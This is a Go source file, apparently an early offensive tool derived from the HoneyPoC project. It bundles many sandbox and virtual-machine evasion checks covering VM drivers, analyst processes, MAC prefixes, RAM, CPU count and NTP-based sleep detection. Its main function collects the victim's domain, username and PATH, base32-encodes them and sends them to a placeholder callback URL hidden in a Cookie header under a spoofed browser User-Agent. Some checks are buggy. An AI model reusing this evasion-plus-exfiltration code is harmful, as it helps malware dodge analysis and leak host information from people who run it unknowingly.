// Massive Work in Progress -Built off the back of AutoPoC and HoneyPoC projects
// Eventual plan is to have a reverse blacklist of various paths, users and hostnames, if the data matches then run the code, else no hax
// ZephrFish 2022
// v0.3
// Sandbox Checks taken from https://github.com/redcode-labs/Coldfire
// Additional sandbox checks added in following structure

package main

import (
	"encoding/base32"
	"encoding/binary"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"runtime"
	"strings"
	"time"

	ps "github.com/mitchellh/go-ps"
)

// Aux Functions
// Processes returns a map of a PID to its respective process name.
func Processes() (map[int]string, error) {
	prs := make(map[int]string)
	processList, err := ps.Processes()
	if err != nil {
		return nil, err
	}

	for x := range processList {
		process := processList[x]
		prs[process.Pid()] = process.Executable()
	}

	return prs, nil
}

func getNTPTime() time.Time {
	type ntp struct {
		FirstByte, A, B, C uint8
		D, E, F            uint32
		G, H               uint64
		ReceiveTime        uint64
		J                  uint64
	}
	sock, _ := net.Dial("udp", "us.pool.ntp.org:123")
	sock.SetDeadline(time.Now().Add((2 * time.Second)))
	defer sock.Close()
	transmit := new(ntp)
	transmit.FirstByte = 0x1b
	binary.Write(sock, binary.BigEndian, transmit)
	binary.Read(sock, binary.BigEndian, transmit)
	return time.Date(1900, 1, 1, 0, 0, 0, 0, time.UTC).Add(time.Duration(((transmit.ReceiveTime >> 32) * 1000000000)))
}

// ContainsAny checks if a string exists within a list of strings.
func ContainsAny(str string, elements []string) bool {
	for element := range elements {
		e := elements[element]
		if strings.Contains(str, e) {
			return true
		}
	}

	return false
}

// To update with paths from HoneyPoC too
func SandboxFilepath() bool {
	EvidenceOfSandbox := make([]string, 0)
	FilePathsToCheck := [...]string{`C:\windows\System32\Drivers\Vmmouse.sys`,
		`C:\windows\System32\Drivers\vm3dgl.dll`, `C:\windows\System32\Drivers\vmdum.dll`,
		`C:\windows\System32\Drivers\vm3dver.dll`, `C:\windows\System32\Drivers\vmtray.dll`,
		`C:\windows\System32\Drivers\vmci.sys`, `C:\windows\System32\Drivers\vmusbmouse.sys`,
		`C:\windows\System32\Drivers\vmx_svga.sys`, `C:\windows\System32\Drivers\vmxnet.sys`,
		`C:\windows\System32\Drivers\VMToolsHook.dll`, `C:\windows\System32\Drivers\vmhgfs.dll`,
		`C:\windows\System32\Drivers\vmmousever.dll`, `C:\windows\System32\Drivers\vmGuestLib.dll`,
		`C:\windows\System32\Drivers\VmGuestLibJava.dll`, `C:\windows\System32\Drivers\vmscsi.sys`,
		`C:\windows\System32\Drivers\VBoxMouse.sys`, `C:\windows\System32\Drivers\VBoxGuest.sys`,
		`C:\windows\System32\Drivers\VBoxSF.sys`, `C:\windows\System32\Drivers\VBoxVideo.sys`,
		`C:\windows\System32\vboxdisp.dll`, `C:\windows\System32\vboxhook.dll`,
		`C:\windows\System32\vboxmrxnp.dll`, `C:\windows\System32\vboxogl.dll`,
		`C:\windows\System32\vboxoglarrayspu.dll`, `C:\windows\System32\vboxoglcrutil.dll`,
		`C:\windows\System32\vboxoglerrorspu.dll`, `C:\windows\System32\vboxoglfeedbackspu.dll`,
		`C:\windows\System32\vboxoglpackspu.dll`, `C:\windows\System32\vboxoglpassthroughspu.dll`,
		`C:\windows\System32\vboxservice.exe`, `C:\windows\System32\vboxtray.exe`,
		`C:\windows\System32\VBoxControl.exe`}
	for _, FilePath := range FilePathsToCheck {
		if _, err := os.Stat(FilePath); err == nil {
			EvidenceOfSandbox = append(EvidenceOfSandbox, FilePath)
		}
	}
	if len(EvidenceOfSandbox) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other sandboxes via Canaries
func SandboxHostname() bool {
	SandBoxHostnameEvidence := make([]string, 0)
	HostnamesToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`, `USER-PC`}
	for _, HostnameToCheck := range HostnamesToCheck {
		if _, err := os.Stat(HostnameToCheck); err == nil {
			SandBoxHostnameEvidence = append(SandBoxHostnameEvidence, HostnameToCheck)
		}
	}

	if len(SandBoxHostnameEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// Function is a work in progress, still gathering data from VT and other sandboxes via Canaries same as above function
func SandboxUserName() bool {
	SandBoxUserEvidence := make([]string, 0)
	UsersToCheck := [...]string{`WIN-VUA6POUV5UP`, `work`}
	for _, Users := range UsersToCheck {
		if _, err := os.Stat(Users); err == nil {
			SandBoxUserEvidence = append(SandBoxUserEvidence, Users)
		}
	}

	if len(SandBoxUserEvidence) == 0 {
		return false
	} else {
		return true
	}
}

// SandboxProc checks if there are processes that indicate a virtualized environment.
func SandboxProc() bool {
	sandbox_processes := []string{`srvpost`, `qemu-ga`, `vmsrvc`, `tcpview`, `wireshark`, `visual basic`, `fiddler`,
		`vmware`, `vbox`, `process explorer`, `autoit`, `vboxtray`, `vmtools`,
		`vmrawdsk`, `vmusbmouse`, `vmvss`, `vmscsi`, `vmxnet`, `vmx_svga`,
		`vmmemctl`, `df5serv`, `vboxservice`, `vmhgfs`}
	p, _ := Processes()
	for _, name := range p {
		if ContainsAny(name, sandbox_processes) {
			return true
		}
	}
	return false
}

// Check sandbox temp folder, else exit
func SandboxTmp(entries int) bool {
	tmp_dir := `C:\windows\temp`
	files, err := ioutil.ReadDir(tmp_dir)
	if err != nil {
		return true
	}

	return len(files) < entries
}

// SandboxRam is used to check if the environment's RAM is less than a given size.
func SandboxRam(ram_mb int) bool {
	var m runtime.MemStats
	runtime.ReadMemStats(&m)
	rmb := uint64(ram_mb)
	ram := m.TotalAlloc / 1024 / 1024

	return ram < rmb
}

// SandboxUtc is used to check if the environment is in a properly set Utc timezone.
func SandboxUtc() bool {
	_, offset := time.Now().Zone()

	return offset == 0
}

// SandboxProcnum is used to check if the environment has processes less than a given integer.
func SandboxProcnum(proc_num int) bool {
	processes, err := ps.Processes()
	if err != nil {
		return true
	}

	return len(processes) < proc_num
}

// SandboxSleep is used to check if the virtualized environment is speeding up the sleeping process.
func SandboxSleep() bool {
	z := false
	firstTime := getNTPTime()
	sleepSeconds := 10
	time.Sleep(time.Duration(sleepSeconds*1000) * time.Millisecond)
	secondTime := getNTPTime()
	difference := secondTime.Sub(firstTime).Seconds()
	if difference < float64(sleepSeconds) {
		z = true
	}
	return z
}

// SandboxMac is used to check if the environment's MAC address matches standard MAC adddresses of virtualized environments.
func SandboxMac() bool {
	hits := 0
	sandbox_macs := []string{`00:0C:29`, `00:1C:14`,
		`00:50:56`, `00:05:69`, `08:00:27`}
	ifaces, _ := net.Interfaces()

	for _, iface := range ifaces {
		for _, mac := range sandbox_macs {
			if strings.Contains(strings.ToLower(iface.HardwareAddr.String()), strings.ToLower(mac)) {
				hits += 1
			}
		}
	}

	return hits == 0
}

// SandboxCpu is used to check if the environment's
// cores are less than a given integer.
func SandboxCpu(cores int) bool {
	x := false
	num_procs := runtime.NumCPU()
	if !(num_procs >= cores) {
		x = true
	}
	return x
}

// SandboxAll is used to check if an environment is virtualized by testing all sandbox checks.
// func SandboxAll() bool {
// 	values := []bool{
// 		SandboxProc(),
// 		SandboxFilepath(),
// 		SandboxCpu(2),
// 		SandboxSleep(),
// 		SandboxTmp(100),
// 		SandboxRam(2048),
// 		SandboxMac(),
// 		SandboxUtc(),
// 		SandboxHostname(),
// 		SandboxUserName(),
// 	}

// 	for s := range values {
// 		x := values[s]
// 		if x {
// 			return true
// 		}
// 	}

// 	return false
// }

// Execution check
func SandExecBlock() bool {
	values := []bool{
		SandboxHostname(),
		SandboxUserName(),
	}

	for Check := range values {
		SandBoxExec := values[Check]
		if SandBoxExec {
			return true
		}
	}

	return false
}

func main() {

	client := &http.Client{}

	// Update this to match whatever callback URL we decide on
	CallBack := "CHANGEME"

	var envDomain string = os.Getenv("USERDOMAIN")
	var envUsername string = os.Getenv("USERNAME")
	var envPath string = os.Getenv("PATH")
	// TGTIP := os.Args[2]
	// TGT := string(TGTIP)
	// TargetIPPre := strings.Replace(TGT, "\r", "", -1)
	// TargetIP := strings.Replace(TargetIPPre, "\r", "", -1)

	data := []byte(string(" Domain\n: " + envDomain + " Username\n: " + envUsername + " Path\n " + envPath))
	str := base32.StdEncoding.EncodeToString(data)

	req, err := http.NewRequest("GET", CallBack, nil)
	if err != nil {
		log.Fatalln(err)
	}
	
	// We can change this to whatever we want
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36")
	req.Header.Set("Cookie", str)
	// req.Header.Set("X-Target-IP", TargetIP)

	resp, err := client.Do(req)

	if err != nil {
		log.Fatalln(err)
		fmt.Println(resp)
	}

}
